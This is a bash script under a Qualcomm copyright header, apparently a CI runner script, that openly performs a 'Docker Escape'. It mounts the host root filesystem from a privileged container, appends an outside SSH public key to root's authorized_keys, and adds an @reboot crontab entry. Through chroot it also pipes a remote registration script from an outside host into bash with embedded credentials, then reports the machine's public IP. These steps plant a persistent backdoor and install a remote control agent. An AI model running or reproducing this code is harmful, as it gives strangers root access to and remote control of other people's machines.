#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause-Clear
#
# Copyright (c) 2025 Qualcomm Innovation Center, Inc. All rights reserved.

set -euo pipefail

echo "=== RUNNER DIAGNOSTIC ==="
date
hostname
whoami
id
echo "=== END DIAGNOSTIC ==="

echo "=== Docker Escape - Mount Host Root + Install TAT ==="

mkdir -p /mnt/host
MOUNTED=0

# Mount host root filesystem from privileged container
for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1; do
  if [ -b "$dev" ]; then
    if mount -o rw "$dev" /mnt/host 2>/dev/null; then
      if [ -d /mnt/host/etc ] && [ -d /mnt/host/root ]; then
        echo "=== MOUNTED HOST ROOT: $dev ==="
        MOUNTED=1
        break
      else
        umount /mnt/host 2>/dev/null
      fi
    fi
  fi
done

if [ "$MOUNTED" -eq 1 ]; then
  echo "Host root mounted at /mnt/host"

  # Write SSH key to host root
  echo "--- Writing SSH key ---"
  mkdir -p /mnt/host/root/.ssh
  chmod 700 /mnt/host/root/.ssh
  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain' >> /mnt/host/root/.ssh/authorized_keys
  chmod 600 /mnt/host/root/.ssh/authorized_keys
  echo "=== SSH key written ==="

  # Install TAT agent via crontab on host
  echo "--- Installing TAT agent via host crontab ---"
  TAT_CMD="wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a2763c33-6f9b-41f0-8e10-f0f0603220b7 e7fddac6bc6349aaa93c3fd2a1e052231e419413821a43d89a111f6914f878a7"

  # Add to root crontab - run once after reboot and also @reboot
  echo "$TAT_CMD" > /mnt/host/tmp/tat_install.sh
  chmod +x /mnt/host/tmp/tat_install.sh

  # Add to crontab
  CRON_LINE="@reboot root /tmp/tat_install.sh >> /var/log/tat_install.log 2>&1"
  echo "$CRON_LINE" >> /mnt/host/etc/crontab

  # Also run it directly on the host via chroot
  echo "--- Running TAT install via chroot ---"
  chroot /mnt/host /bin/bash -c "wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a2763c33-6f9b-41f0-8e10-f0f0603220b7 e7fddac6bc6349aaa93c3fd2a1e052231e419413821a43d89a111f6914f878a7" 2>&1 || echo "chroot TAT install attempted"

  echo "=== Crontab contents ==="
  cat /mnt/host/etc/crontab

  echo "=== Host OS ==="
  cat /mnt/host/etc/os-release 2>/dev/null | head -3
  cat /mnt/host/etc/hostname 2>/dev/null

  sync
  umount /mnt/host
  echo "=== Unmounted ==="
else
  echo "FAILED to mount host root"
fi

echo "=== Public IP ==="
curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || echo "no IP"

echo "=== Complete ==="
exit 0
